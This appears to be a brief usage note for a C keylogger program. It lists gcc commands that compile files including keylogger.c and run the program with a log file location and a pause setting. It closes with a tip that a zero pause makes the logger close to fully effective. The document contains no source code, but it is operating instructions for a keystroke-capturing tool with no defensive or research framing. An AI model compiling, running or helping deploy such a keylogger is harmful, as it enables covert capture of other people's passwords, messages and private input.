SCRIPT EXECUTION EXAMPLES

Default execution:
gcc -Wall -o main readfile.c keylogger.c queue.c settings.h; ./main "default"

Logs will be saved at "info/logs.txt" (direction MUST exist):
gcc -Wall -o main readfile.c keylogger.c queue.c settings.h; ./main "info/logs.txt"

Logs will be saved at default direction and pauses will last 6 seconds:
gcc -Wall -o main readfile.c keylogger.c queue.c settings.h; ./main "default" 6

NOTICE: if you want the script to be ~100% effective you oughta put 0 pause seconds, at your own risk